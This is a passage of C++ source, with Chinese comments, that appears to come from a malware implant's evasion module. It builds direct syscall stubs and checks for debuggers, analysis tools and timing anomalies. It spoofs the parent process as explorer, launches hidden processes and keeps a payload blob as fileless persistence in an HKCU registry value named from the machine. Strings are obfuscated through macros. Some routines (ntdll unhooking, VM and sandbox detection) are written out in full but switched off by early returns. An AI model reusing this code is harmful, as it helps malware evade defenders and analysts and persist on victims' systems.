        int32_t ssn = NtdllSsn(procHash);
        if (ssn >= 0) { stub = BuildSyscallStub(ssn); viaSyscall = (stub != nullptr); }
    }
    if (!stub) {
        stub = NtdllExport(procHash);
        if (stub) InterlockedIncrement(&g_syscallMisses);
    }
    if (n < 32) { cache[n].h = procHash; cache[n].p = stub; n++; }
    LeaveCriticalSection(&cs);
    if (okOut) *okOut = viaSyscall;
    return stub;
}

LONG NtAlloc(HANDLE proc, void** base, size_t size, ULONG protect, ULONG type) {
    SIZE_T sz = (SIZE_T)size;   // SIZE_T 与 size_t 在 x64 同宽，显式转换避免歧义
    return R6M_NT(NtAllocateVirtualMemory)(proc, base, (ULONG_PTR)0, &sz, type, protect);
}
LONG NtProtect(HANDLE proc, void* base, size_t size, ULONG prot, ULONG* old) {
    SIZE_T sz = (SIZE_T)size;
    void* b = base;
    return R6M_NT(NtProtectVirtualMemory)(proc, &b, &sz, prot, old);
}
LONG NtWrite(HANDLE proc, void* dst, const void* src, size_t size) {
    SIZE_T done = 0;
    return R6M_NT(NtWriteVirtualMemory)(proc, dst, (PVOID)src, size, &done);
}
LONG NtRead(HANDLE proc, const void* src, void* dst, size_t size) {
    SIZE_T done = 0;
    return R6M_NT(NtReadVirtualMemory)(proc, (PVOID)src, dst, size, &done);
}
LONG NtQueryInfo(HANDLE proc, ULONG cls, void* buf, ULONG len, ULONG* ret) {
    return R6M_NT(NtQueryInformationProcess)(proc, cls, buf, len, ret);
}
void NtSleepMs(uint64_t ms) {
    LARGE_INTEGER li;
    li.QuadPart = -(LONGLONG)(ms * 10000ULL);
    R6M_NT(NtDelayExecution)(FALSE, &li);
}

// ═══════════════════════════════════════════════════════════════════════════
// 4) ntdll 反 hook
// ═══════════════════════════════════════════════════════════════════════════

bool UnhookNtdll(bool quiet) {
    return false;  // [EV-REMOVED] ntdll unhook 已停用

    if (!Cfg().unhook) return false;
    // 只用 GetModuleHandleA（避免 Api::M ⇄ Image 初始化环，见 NtdllSsn 说明）
    HMODULE hMod = GetModuleHandleA("ntdll.dll");
    if (!hMod) return false;

    wchar_t sysDir[MAX_PATH] = {};
    GetSystemDirectoryW(sysDir, MAX_PATH);
    std::wstring path = std::wstring(sysDir) + L"\\ntdll.dll";
    HANDLE h = CreateFileW(path.c_str(), GENERIC_READ, FILE_SHARE_READ, nullptr,
                           OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (h == INVALID_HANDLE_VALUE) return false;
    DWORD fsz = GetFileSize(h, nullptr);
    if (fsz == INVALID_FILE_SIZE || fsz < 0x1000) { CloseHandle(h); return false; }
    std::vector<uint8_t> raw(fsz);
    DWORD got = 0;
    if (!ReadFile(h, raw.data(), fsz, &got, nullptr) || got != fsz) { CloseHandle(h); return false; }
    CloseHandle(h);

    auto* dDos = (IMAGE_DOS_HEADER*)raw.data();
    if (dDos->e_magic != IMAGE_DOS_SIGNATURE) return false;
    auto* dNt = (IMAGE_NT_HEADERS64*)(raw.data() + dDos->e_lfanew);
    auto* sec = IMAGE_FIRST_SECTION(dNt);
    int patched = 0;
    for (int i = 0; i < dNt->FileHeader.NumberOfSections; i++, sec++) {
        char nm[9] = {};
        memcpy(nm, sec->Name, 8);
        if (strcmp(nm, ".text") != 0) continue;

        uint8_t* dst = (uint8_t*)hMod + sec->VirtualAddress;
        const uint8_t* src = raw.data() + sec->PointerToRawData;
        SIZE_T vsz = sec->Misc.VirtualSize;
        if (sec->SizeOfRawData < vsz) vsz = sec->SizeOfRawData;

        DWORD oldProt = 0;
        if (!VirtualProtect(dst, vsz, PAGE_EXECUTE_READWRITE, &oldProt)) break;
        // 以 16 字节为粒度比对；只回写确实不同的块（减少写操作被监控的面）
        for (SIZE_T off = 0; off + 16 <= vsz; off += 16) {
            if (memcmp(dst + off, src + off, 16) == 0) continue;
            memcpy(dst + off, src + off, 16);
            patched++;
        }
        DWORD tmp = 0;
        VirtualProtect(dst, vsz, oldProt, &tmp);
        break;
    }
    FlushInstructionCache(GetCurrentProcess(), hMod, 0);
    if (patched && !quiet) {
        char msg[96];
        snprintf(msg, sizeof(msg), "[ev] ntdll .text restored (%d chunks)\n", patched);
        OutputDebugStringA(msg);
    }
    return patched > 0;
}

// ═══════════════════════════════════════════════════════════════════════════
// ═══════════════════════════════════════════════════════════════════════════

uint32_t CheckDebugger() {
    uint32_t bits = 0;

    // ── PEB 直读（x64: gs:[0x60]；BeingDebugged +0x02，NtGlobalFlag +0xBC）──
    const uint8_t* peb = (const uint8_t*)__readgsqword(0x60);
    if (peb) {
        if (peb[0x02]) bits |= EV_PEB_DEBUGGED;
        if ((*(const uint32_t*)(peb + 0xBC) & 0x70) != 0) bits |= EV_PEB_NT_GLOBAL;
        const uint8_t* heap = *(const uint8_t* const*)(peb + 0x30);   // ProcessHeap
        if (heap) {
            uint32_t flags = *(const uint32_t*)(heap + 0x70);
            uint32_t force = *(const uint32_t*)(heap + 0x74);
            // 正常进程堆：Flags == HEAP_GROWABLE(2)，ForceFlags == 0。
            // 原写法 `(flags & ~0x2u) != 0x2u` 把正常值 2 也算成异常
            // （(2 & ~2)=0，而 0 != 2 为真）→ 恒命中，假阳性。
            // 正确判据：除 HEAP_GROWABLE 之外还有别的位 → 可疑。
            if ((flags & ~0x2u) != 0 || force != 0) bits |= EV_HEAP_FLAGS;
        }
    }

    // ── NtQueryInformationProcess × 3（走直系统调用，绕开被 hook 的 kernel32）──
    {
        HANDLE port = nullptr;
        if (NtQueryInfo(GetCurrentProcess(), 7, &port, sizeof(port), nullptr) == 0 && port)
            bits |= EV_NT_QUERY_DEBUG;
        ULONG flags = 1;
        if (NtQueryInfo(GetCurrentProcess(), 0x1F, &flags, sizeof(flags), nullptr) == 0 && flags == 0)
            bits |= EV_NT_QUERY_DEBUG;
        HANDLE dbg = nullptr;
        if (NtQueryInfo(GetCurrentProcess(), 0x1E, &dbg, sizeof(dbg), nullptr) == 0 && dbg)
            bits |= EV_DEBUG_OBJECT;
    }

    // ── 硬件断点（调试寄存器）──
    CONTEXT ctx = {};
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    if (GetThreadContext(GetCurrentThread(), &ctx)) {
        if (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3) bits |= EV_DEBUG_OBJECT;
    }

    // ── KUSER_SHARED_DATA 一致性（TickCountLow × Multiplier ≈ GetTickCount64）──
    // KUSER_SHARED_DATA（基址 0x7FFE0000）关键字段：
    //   +0x004  TickCountMultiplier            （乘数，典型 0x0A000000）
    //   +0x320  TickCount（KSYSTEM_TIME 12 字节：LowPart, High1Time, High2Time）
    // 原实现从 0x7FFE0320 读 kuser[1] 当"乘数"，实际读到的是 High1Time（秒），
    // 于是算出的"毫秒"与 GetTickCount64 差一个数量级 → 恒命中（假阳性）。
    {
        const volatile uint32_t* kb = (const volatile uint32_t*)0x7FFE0000ULL;
        const uint32_t mul = kb[1];                               // TickCountMultiplier
        const volatile uint32_t* tc = (const volatile uint32_t*)0x7FFE0320ULL;
        uint32_t low = 0, high = 0, high2 = 0;
        for (int i = 0; i < 8; i++) {                             // 读一致性：High1 必须等于 High2
            high = tc[1]; low = tc[0]; high2 = tc[2];
            if (high == high2) break;
        }
        if (mul == 0) bits |= EV_KUSER_SHARED;
        else if (high != high2) bits |= EV_KUSER_SHARED;          // 读不稳：时钟被篡改/虚拟化
        else {
            // 标准换算：High1Time 为整秒，LowPart 为亚秒（乘数 >>24 后得到毫秒）
            uint64_t ms = (uint64_t)high * 1000ULL + (((uint64_t)low * (uint64_t)mul) >> 24);
            uint64_t real = GetTickCount64();
            uint64_t diff = ms > real ? ms - real : real - ms;
            // 容差 300s：睡眠/休眠、NTP 校时都会造成分钟级偏差，不该据此指控。
            // 该位**不在** hard 掩码里，只累积分值，所以宁可放宽。
            if (ms != 0 && diff > 300000) bits |= EV_KUSER_SHARED;
        }
    }

    return bits;
}

// ═══════════════════════════════════════════════════════════════════════════
// 6) 反虚拟化
// ═══════════════════════════════════════════════════════════════════════════

uint32_t CheckVirtualization() {
    return 0;  // [EV-REMOVED] VM 探测已停用

    uint32_t bits = 0;

    // ── 注册表：BIOS / 磁盘 / 显卡描述里的厂商串 ──
    {
        struct { HKEY root; const wchar_t* sub; const wchar_t* val; } regs[] = {
            { HKEY_LOCAL_MACHINE, R6M_WSTR(bios_bios, 8AC7350EA9649B17),  R6M_WSTR(systemmanu, B25B42E7159BD04D) },
            { HKEY_LOCAL_MACHINE, R6M_WSTR(bios_bios, 8AC7350EA9649B17),  R6M_WSTR(systemprod, C5EF6F6DED8C89D8) },
            { HKEY_LOCAL_MACHINE, R6M_WSTR(sys_desc, 6ED171B8DCA5F934),   R6M_WSTR(videobios, C279CDE1E670AB3D) },
            { HKEY_LOCAL_MACHINE, R6M_WSTR(disk_enum, 4DB00F47737FD804),  L"0" },
        };
        const wchar_t* keys[] = { R6M_WSTR(v_box, 5CD0AC00FC0E3846), R6M_WSTR(vmware, 18113D9654AB1189), R6M_WSTR(fn_virtual, 3A8BDBD8E17B835C), R6M_WSTR(qemu, A7B9F2080041DB55), R6M_WSTR(xen, BF959E197FD64B38) };
        for (auto& r : regs) {
            std::wstring v;
            if (!RegReadStr(r.root, r.sub, r.val, v) || v.empty()) continue;
            for (auto* k : keys) if (ContainsI(v, k)) { bits |= EV_VM_VENDOR; break; }
        }
    }

    // ── 虚拟机组件进程 ──
    {
        const wchar_t* names[] = {
            R6M_WSTR(p_vmsrvc, 8EB2FABA7C8281E6), R6M_WSTR(p_vmusrvc, 22C9018637CB0921), R6M_WSTR(p_vboxsvc, 8D287550F944C55D), R6M_WSTR(p_vboxtray, 4287EC097402EFCA),
            R6M_WSTR(p_vmtoolsd, FC33C9EB0A022661), R6M_WSTR(p_vmwtray, 0F3030AFBB869DE9), R6M_WSTR(p_xensvc, 6E50E85644C57C8B), R6M_WSTR(p_qemuga, 520DAF746C050B14),
        };
        HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (snap != INVALID_HANDLE_VALUE) {
            PROCESSENTRY32W pe = { sizeof(pe) };
            if (Process32FirstW(snap, &pe)) {
                do {
                    for (auto* n : names) {
                        if (ContainsI(pe.szExeFile, n)) { bits |= EV_VM_PROC; break; }
                    }
                    if (bits & EV_VM_PROC) break;
                } while (Process32NextW(snap, &pe));
            }
            CloseHandle(snap);
        }
    }

    // ── 虚拟机驱动文件 ──
    {
        const wchar_t* files[] = {
            R6M_WSTR(f_vboxmouse, 5A03FAF704F3B7EA), R6M_WSTR(f_vboxguest, 93F383F7859A467D), R6M_WSTR(f_vmhgfs, D3094852F1146A0D), R6M_WSTR(f_vmmouse, 2F0CE119123DC4D0),
            R6M_WSTR(f_vmci, 63F5B62A4341731B), R6M_WSTR(f_qemuga, CA42EB3E8D3DAE43), R6M_WSTR(f_vboxsf, 7553CDFAE4BCEE64),
        };
        for (auto* f : files) {
            if (GetFileAttributesW(f) != INVALID_FILE_ATTRIBUTES) { bits |= EV_VM_FILE; break; }
        }
    }

    // ── MAC OUI 前缀 ──
    {
        static const uint8_t kOui[][3] = {
            {0x00,0x05,0x69}, {0x00,0x0C,0x29}, {0x00,0x50,0x56},
            {0x08,0x00,0x27}, {0x00,0x16,0x3E}, {0x52,0x54,0x00},
            {0x00,0x1C,0x42}, {0x00,0x0F,0x4B},
        };
        ULONG sz = 0;
        // 走动态解析：iphlpapi 的 GetAdaptersInfo 不再静态导入
        if (EvGetAdaptersInfo(nullptr, &sz) == ERROR_BUFFER_OVERFLOW && sz) {
            std::vector<uint8_t> buf(sz);
            if (EvGetAdaptersInfo((PIP_ADAPTER_INFO)buf.data(), &sz) == ERROR_SUCCESS) {
                for (auto* a = (PIP_ADAPTER_INFO)buf.data(); a; a = a->Next) {
                    for (auto& o : kOui) {
                        if (memcmp(a->Address, o, 3) == 0) { bits |= EV_VM_MAC; break; }
                    }
                    if (bits & EV_VM_MAC) break;
                }
            }
        }
    }

    return bits;
}

// ═══════════════════════════════════════════════════════════════════════════
// ═══════════════════════════════════════════════════════════════════════════

uint32_t CheckSandboxHeuristics() {
    return 0;  // [EV-REMOVED] 沙箱探测已停用

    uint32_t bits = 0;

    {
        HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        int n = 0;
        if (snap != INVALID_HANDLE_VALUE) {
            PROCESSENTRY32W pe = { sizeof(pe) };
            if (Process32FirstW(snap, &pe)) {
                do { n++; } while (Process32NextW(snap, &pe));
            }
            CloseHandle(snap);
        }
        if (n > 0 && n < 35) bits |= EV_FEW_PROCESSES;
    }

    // ── 物理内存 < 2GB ──
    {
        MEMORYSTATUSEX ms = { sizeof(ms) };
        if (GlobalMemoryStatusEx(&ms) && ms.ullTotalPhys < 2ULL * 1024 * 1024 * 1024)
            bits |= EV_LOW_RAM;
    }

    // ── 系统盘 < 60GB ──
    {
        ULARGE_INTEGER freeB{}, totalB{};
        wchar_t win[MAX_PATH] = {};
        GetWindowsDirectoryW(win, MAX_PATH);
        wchar_t root[4] = { win[0], L':', L'\\', 0 };
        if (GetDiskFreeSpaceExW(root, &freeB, &totalB, nullptr)
            && totalB.QuadPart > 0 && totalB.QuadPart < 60ULL * 1024 * 1024 * 1024)
            bits |= EV_LOW_DISK;
    }

    // ── 无用户交互 + 屏幕尺寸 ──
    {
        LASTINPUTINFO lii = { sizeof(lii) };
        if (GetLastInputInfo(&lii)) {
            DWORD idle = GetTickCount() - lii.dwTime;
            if (idle > 30 * 60 * 1000) bits |= EV_NO_USERACTIVITY;
        }
        int cx = GetSystemMetrics(SM_CXSCREEN), cy = GetSystemMetrics(SM_CYSCREEN);
        if (cx > 0 && cy > 0 && (cx < 1024 || cy < 768)) bits |= EV_LOW_RES_TIMING;
    }

    // ── 用户名 / 计算机名黑名单 ──
    {
        wchar_t user[256] = {}, comp[256] = {};
        DWORD n = 256; EvGetUserNameW(user, &n);
        n = 256; EvGetComputerNameW(comp, &n);
        const wchar_t* ubad[] = {
            R6M_WSTR(u_sandbox, 2E3C6336DA5A2A44), R6M_WSTR(u_maltest, DE75AA70E9F24D35), R6M_WSTR(u_malware, 16B6F976C0EFA170), R6M_WSTR(u_virus, 3AC5DD51EA6FDBFE),
            R6M_WSTR(u_tequila, E38411D9A0F263A0), R6M_WSTR(u_wsandbox, 181C566DE370CF21), R6M_WSTR(u_hal9th, E3E8183C4E364E5D), R6M_WSTR(u_john, 55F311E98CBC275C),
            R6M_WSTR(u_payload, 3B89F90689249305), R6M_WSTR(u_peter, 39848C84669EB3C9), R6M_WSTR(u_test, F9E6E6EF197C2B25), R6M_WSTR(u_admin, E5CDE7FDDA328454),
        };
        for (auto* u : ubad) if (ContainsI(user, u)) { bits |= EV_USERNAME_SUSPECT; break; }
        const wchar_t* cbad[] = {
            R6M_WSTR(u_maltest, DE75AA70E9F24D35), R6M_WSTR(u_malware, 16B6F976C0EFA170), R6M_WSTR(u_virus, 3AC5DD51EA6FDBFE), R6M_WSTR(c_userpc, DD59ADDD48F599AC),
            R6M_WSTR(c_johnpc, 5EB00B090CAEE1BE), R6M_WSTR(u_payload, 3B89F90689249305), R6M_WSTR(c_sand1, 4BD1FF676BCEEC16),
        };
        for (auto* c : cbad) if (ContainsI(comp, c)) { bits |= EV_COMPUTER_SUSPECT; break; }
    }

    return bits;
}

// ═══════════════════════════════════════════════════════════════════════════
// 8) 模块与工具扫描
// ═══════════════════════════════════════════════════════════════════════════

namespace {
// EnumWindows 回调需要上下文；这里用文件作用域 static 避免 lambda 捕获 ABI 问题
uint32_t g_titleBits = 0;
BOOL CALLBACK TitleProc(HWND hwnd, LPARAM) {
    wchar_t title[256] = {};
    if (GetWindowTextW(hwnd, title, 256) > 0 && *title) {
        const wchar_t* keys[] = {
            R6M_WSTR(w_x64dbg, 9F5627C8D228677C), R6M_WSTR(w_x32dbg, 75CCD62A897B7B2D), R6M_WSTR(w_olly, 7AA52B385191D87C), R6M_WSTR(w_ida, 4119D819C913A3B3), R6M_WSTR(w_windbg, 499CBFA7697DABE8),
            R6M_WSTR(w_procmon, 4CFA4643417B5DF0), R6M_WSTR(w_prochk, 2DB8E795F2747B24), R6M_WSTR(w_wireshark, 51A415F9923695AD), R6M_WSTR(w_fiddler, CED0DFA082BA0D1B),
            R6M_WSTR(w_ce, CDD4597DE01F2BEE), R6M_WSTR(w_imm, D9039AE5F7599E17),
        };
        for (auto* k : keys) {
            if (ContainsWordI(title, k)) { g_titleBits |= EV_TITLE_SCAN; return FALSE; }
        }
    }
    return TRUE;
}
}

uint32_t CheckModulesAndTools() {
    uint32_t bits = 0;

    {
        static const char* bad[] = {
            "sbiedll.dll", "dbghelp.dll", "api_log.dll", "dir_watch.dll",
            "pstorec.dll", "vmcheck.dll", "wpespy.dll", "cmdvrt32.dll",
            "snxhk.dll", "sxin.dll", "sf2.dll",
        };
        HMODULE mods[1024] = {};
        DWORD need = 0;
        if (EnumProcessModules(GetCurrentProcess(), mods, sizeof(mods), &need)) {
            int n = (int)(need / sizeof(HMODULE));
            for (int i = 0; i < n && i < 1024; i++) {
                char path[MAX_PATH] = {};
                if (!GetModuleFileNameA(mods[i], path, MAX_PATH)) continue;
                const char* b = strrchr(path, '\\');
                b = b ? b + 1 : path;
                for (auto* s : bad) if (_stricmp(b, s) == 0) { bits |= EV_SANDBOX_DLL; break; }
            }
        }
    }

    // ── 分析工具进程 ──
    {
        const wchar_t* tools[] = {
            R6M_WSTR(t_wireshark, 6EA31E2F07F2C893), R6M_WSTR(t_fiddler, 78DFFF95974B1315), R6M_WSTR(t_x64dbg, 944FACB6F978A5F2), R6M_WSTR(t_x32dbg, 6196970BECE2D9F3),
            R6M_WSTR(t_ollydbg, A16CD36DD11C8BF2), R6M_WSTR(t_ida64, 7162BBCA73306A1F), R6M_WSTR(t_ida, 482006F2B18B11ED), R6M_WSTR(t_idaq, 54B510BF55896E38),
            R6M_WSTR(t_idaq64, 055263751AA945C2), R6M_WSTR(t_windbg, BDCBC3DAC913DFD6), R6M_WSTR(t_prochacker, 95050A224A3B7816), R6M_WSTR(t_procmon, C274EF461FC53033),
            R6M_WSTR(t_procmon64, 2334D5700BE5A631), R6M_WSTR(t_procexp, 13ED80E542433C9A), R6M_WSTR(t_procexp64, 0229D9A13D3D6298), R6M_WSTR(t_tcpview, 168B5F1AAD3994CF),
            R6M_WSTR(t_autoruns, 880C486DCC4145EA), R6M_WSTR(t_filemon, B2D4172F7A6F687D), R6M_WSTR(t_regmon, C35485D4E397EE9F), R6M_WSTR(t_immunity, 53DF15924D95611E),
            R6M_WSTR(t_scylla, 2C419637F340EC63), R6M_WSTR(t_peid, B56BB17F7D3F071D), R6M_WSTR(t_lordpe, F08501ECBF70B36F), R6M_WSTR(t_dumpit, C8579BA6E00641F4),
            R6M_WSTR(t_frida, 3BF88CDD70810511),
        };
        HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (snap != INVALID_HANDLE_VALUE) {
            PROCESSENTRY32W pe = { sizeof(pe) };
            if (Process32FirstW(snap, &pe)) {
                do {
                    for (auto* t : tools) {
                        if (ContainsWordI(pe.szExeFile, t)) { bits |= EV_ANALYSIS_TOOLS; break; }
                    }
                    if (bits & EV_ANALYSIS_TOOLS) break;
                } while (Process32NextW(snap, &pe));
            }
            CloseHandle(snap);
        }
    }

    // ── 顶层窗口标题 ──
    g_titleBits = 0;
    EnumWindows(TitleProc, 0);
    bits |= g_titleBits;

    return bits;
}

// ═══════════════════════════════════════════════════════════════════════════
// 9) 时间兼容处理
// ═══════════════════════════════════════════════════════════════════════════

bool SyntheticTimingDetected() {
    LARGE_INTEGER f{}, a{}, b{};
    FILETIME t1{}, t2{};
    QueryPerformanceFrequency(&f);
    if (f.QuadPart == 0) return true;
    QueryPerformanceCounter(&a);
    GetSystemTimeAsFileTime(&t1);
    uint64_t c1 = tsc();
    volatile int spin = 0;
    for (int i = 0; i < 400000; i++) spin += i;   // 让测量窗口足够长，避免噪声误判
    uint64_t c2 = tsc();
    QueryPerformanceCounter(&b);
    GetSystemTimeAsFileTime(&t2);
    (void)spin;

    double qpcMs = (double)(b.QuadPart - a.QuadPart) * 1000.0 / (double)f.QuadPart;
    uint64_t ft1 = ((uint64_t)t1.dwHighDateTime << 32) | t1.dwLowDateTime;
    uint64_t ft2 = ((uint64_t)t2.dwHighDateTime) << 32 | t2.dwLowDateTime;
    double wallMs = (double)(ft2 - ft1) / 10000.0;
    double tscMs = (double)(c2 - c1) / 3.0e6;   // 假定 ~3GHz，仅用于量级比对

    // 判据修正（2026-10-07）：
    //   QPC 不动 → 时钟确实被冻结，判 true。
    //   但 **wallMs == 0 不能判 true** —— GetSystemTimeAsFileTime 的实际分辨率是
    //   系统时钟中断（常见 15.6ms，未调 timeBeginPeriod 时更粗），而本函数的测量
    //   窗口只有 ~1ms，于是 wallMs 绝大多数时候是 0。原写法把"量不出来"当成
    //   "时间被加速"，导致正常机器 100% 命中 EV_SYNTHETIC_TIME（实测 12/12 静默退出）。
    //   测不出差异就应当不指控（fail-open），与内核对齐：宁漏报不误杀。
    if (qpcMs <= 0.0) return true;
    if (wallMs <= 0.0) return false;
    auto ratio = [](double x, double y) { return x > y ? x / y : y / x; };
    if (ratio(qpcMs, wallMs) > 8.0) return true;
    if (ratio(tscMs, wallMs) > 30.0) return true;
    return false;
}

bool AccelerationDetected() {
    DWORD t0 = GetTickCount();
    ULONGLONG k0 = GetTickCount64();
    LARGE_INTEGER f{}, q0{}, q1{};
    QueryPerformanceFrequency(&f);
    QueryPerformanceCounter(&q0);

    NtSleepMs(600);

    QueryPerformanceCounter(&q1);
    DWORD t1 = GetTickCount();
    ULONGLONG k1 = GetTickCount64();
    double qpcMs = (double)(q1.QuadPart - q0.QuadPart) * 1000.0 / (double)f.QuadPart;
    DWORD tickMs = t1 - t0;
    ULONGLONG tick64Ms = k1 - k0;

    if (qpcMs < 300.0) return true;        // QPC 显示睡眠被跳过
    if (tickMs < 300) return true;         // 32 位 tick 被跳过
    if (tick64Ms < 300) return true;       // 64 位 tick 被跳过
    if (tickMs > tick64Ms + 200 || tick64Ms > tickMs + 200) return true;  // 两源不一致
    return false;
}

uint64_t Jitter(uint64_t base, uint64_t spread) {
    if (spread == 0) return base;
    uint64_t r = 0;
    RandBytes(&r, sizeof(r));
    return base + (r % (spread + 1));
}

void EvasiveSleepMs(uint64_t ms, bool jitter) {
    uint64_t total = jitter ? Jitter(ms, Cfg().sleepJitterMs) : ms;
    while (total > 0) {
        uint64_t slice = total > 900 ? Jitter(600, 500) : total;
        if (slice > total) slice = total;
        NtSleepMs(slice);
        total = (slice >= total) ? 0 : total - slice;
        if (total > 0) {
            uint64_t until = tsc() + 40000;    // ~20us 短忙等，打散定时精度
            while (tsc() < until) _mm_pause();
        }
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// ═══════════════════════════════════════════════════════════════════════════

bool CreateProcessSpoofed(const std::wstring& cmdLine, const std::wstring& cwd,
                          bool hidden, uint32_t* outPid, const wchar_t* parentName) {
    DWORD parentPid = FindPidByName(parentName ? parentName : R6M_WSTR(explorer, 93291E4078031384));
    if (parentPid == 0) parentPid = FindPidByName(R6M_WSTR(explorer, 93291E4078031384));

    HANDLE hParent = nullptr;
    if (parentPid) hParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, parentPid);

    STARTUPINFOEXW si{};
    si.StartupInfo.cb = sizeof(si);
    if (hidden) {
        si.StartupInfo.dwFlags = STARTF_USESHOWWINDOW;
        si.StartupInfo.wShowWindow = SW_HIDE;
    }

    LPPROC_THREAD_ATTRIBUTE_LIST attrs = nullptr;
    if (hParent) {
        SIZE_T sz = 0;
        InitializeProcThreadAttributeList(nullptr, 1, 0, &sz);
        attrs = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, sz);
        if (attrs && InitializeProcThreadAttributeList(attrs, 1, 0, &sz)) {
            // PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000
            if (UpdateProcThreadAttribute(attrs, 0, 0x00020000, &hParent,
                                          sizeof(hParent), nullptr, nullptr)) {
                si.lpAttributeList = attrs;
            } else {
                DeleteProcThreadAttributeList(attrs);
                HeapFree(GetProcessHeap(), 0, attrs);
                attrs = nullptr;
            }
        } else if (attrs) {
            HeapFree(GetProcessHeap(), 0, attrs);
            attrs = nullptr;
        }
    }

    std::vector<wchar_t> cmd(cmdLine.begin(), cmdLine.end());
    cmd.push_back(L'\0');
    PROCESS_INFORMATION pi{};
    DWORD flags = CREATE_NO_WINDOW | (attrs ? EXTENDED_STARTUPINFO_PRESENT : 0);
    BOOL ok = CreateProcessW(nullptr, cmd.data(), nullptr, nullptr, FALSE, flags, nullptr,
                             cwd.empty() ? nullptr : cwd.c_str(), &si.StartupInfo, &pi);
    if (attrs) {
        DeleteProcThreadAttributeList(attrs);
        HeapFree(GetProcessHeap(), 0, attrs);
    }
    if (hParent) CloseHandle(hParent);
    if (!ok) return false;
    if (outPid) *outPid = pi.dwProcessId;
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return true;
}

// ═══════════════════════════════════════════════════════════════════════════
// 11) 无文件常驻（注册表二进制数据键）
// ═══════════════════════════════════════════════════════════════════════════

namespace {
// 值名绑定机器标识：多机之间不共享同一个可关联 特征
std::wstring BlobValueName() {
    static std::wstring cached;
    if (!cached.empty()) return cached;
    wchar_t comp[256] = {};
    DWORD n = 256;
    EvGetComputerNameW(comp, &n);
    uint64_t h = 0xcbf29ce484222325ULL;
    for (wchar_t* p = comp; *p; ++p) { h ^= (uint64_t)((unsigned)*p & 0xFF); h *= 0x100000001b3ULL; }
    wchar_t buf[64];
    swprintf_s(buf, L"{%08X-%04X-%04X-%04X-%012llX}",
               (unsigned)(h >> 32), (unsigned)((h >> 16) & 0xFFFF), (unsigned)(h & 0xFFFF),
               (unsigned)((h >> 8) & 0xFFFF), (unsigned long long)(h & 0xFFFFFFFFFFFFULL));
    cached = buf;
    return cached;
}
}

bool PersistRegistryBlob(const std::vector<uint8_t>& blob, const std::wstring& hostKey) {
    typedef LSTATUS(WINAPI* Create_t)(HKEY, LPCWSTR, DWORD, LPCWSTR, DWORD, REGSAM,
                                      LPSECURITY_ATTRIBUTES, PHKEY, LPDWORD);
    typedef LSTATUS(WINAPI* Set_t)(HKEY, LPCWSTR, DWORD, DWORD, const BYTE*, DWORD);
    typedef LSTATUS(WINAPI* Close_t)(HKEY);
    auto pCreate = (Create_t)Api::P(R6M_M_ADVAPI32, R6M_H_RegCreateKeyExW);
    auto pSet = (Set_t)Api::P(R6M_M_ADVAPI32, R6M_H_RegSetValueExW);
    auto pClose = (Close_t)Api::P(R6M_M_ADVAPI32, R6M_H_RegCloseKey);
    if (!pCreate || !pSet || !pClose) return false;

    std::wstring sub = hostKey.empty() ? std::wstring(R6M_WSTR(blob_subkey, C4D651AF11D5938A)) : hostKey;
    HKEY k = nullptr;
    DWORD disp = 0;
    if (pCreate(HKEY_CURRENT_USER, sub.c_str(), 0, nullptr, 0, KEY_WRITE, nullptr, &k, &disp) != ERROR_SUCCESS)
        return false;
    std::wstring name = BlobValueName();
    LSTATUS st = pSet(k, name.c_str(), 0, REG_BINARY, blob.data(), (DWORD)blob.size());
    pClose(k);
    return st == ERROR_SUCCESS;
}

bool LoadRegistryBlob(std::vector<uint8_t>& out, const std::wstring& hostKey) {
    typedef LSTATUS(WINAPI* Open_t)(HKEY, LPCWSTR, DWORD, REGSAM, PHKEY);
    typedef LSTATUS(WINAPI* Query_t)(HKEY, LPCWSTR, LPDWORD, LPDWORD, LPBYTE, LPDWORD);
    typedef LSTATUS(WINAPI* Close_t)(HKEY);
    auto pOpen = (Open_t)Api::P(R6M_M_ADVAPI32, R6M_H_RegOpenKeyExW);
    auto pQuery = (Query_t)Api::P(R6M_M_ADVAPI32, R6M_H_RegQueryValueExW);
    auto pClose = (Close_t)Api::P(R6M_M_ADVAPI32, R6M_H_RegCloseKey);
    if (!pOpen || !pQuery || !pClose) return false;

    std::wstring sub = hostKey.empty() ? std::wstring(R6M_WSTR(blob_subkey, C4D651AF11D5938A)) : hostKey;
    HKEY k = nullptr;
    if (pOpen(HKEY_CURRENT_USER, sub.c_str(), 0, KEY_READ, &k) != ERROR_SUCCESS) return false;
    std::wstring name = BlobValueName();
    DWORD type = 0, cb = 0;
    LSTATUS st = pQuery(k, name.c_str(), nullptr, &type, nullptr, &cb);
    if (st != ERROR_SUCCESS || type != REG_BINARY || cb == 0 || cb > 64u * 1024 * 1024) {
        pClose(k);
        return false;
    }
    out.resize(cb);
    st = pQuery(k, name.c_str(), nullptr, &type, out.data(), &cb);
    pClose(k);
    if (st != ERROR_SUCCESS) { out.clear(); return false; }
    out.resize(cb);
    return true;
}

bool RemoveRegistryBlob(const std::wstring& hostKey) {
    typedef LSTATUS(WINAPI* Open_t)(HKEY, LPCWSTR, DWORD, REGSAM, PHKEY);
    typedef LSTATUS(WINAPI* DelVal_t)(HKEY, LPCWSTR);
    typedef LSTATUS(WINAPI* DelKey_t)(HKEY, LPCWSTR);
    typedef LSTATUS(WINAPI* Close_t)(HKEY);
    auto pOpen = (Open_t)Api::P(R6M_M_ADVAPI32, R6M_H_RegOpenKeyExW);
    auto pDelV = (DelVal_t)Api::P(R6M_M_ADVAPI32, R6M_H_RegDeleteValueW);
    auto pDelK = (DelKey_t)Api::P(R6M_M_ADVAPI32, R6M_H_RegDeleteKeyW);
    auto pClose = (Close_t)Api::P(R6M_M_ADVAPI32, R6M_H_RegCloseKey);
    if (!pOpen || !pDelV || !pDelK || !pClose) return false;

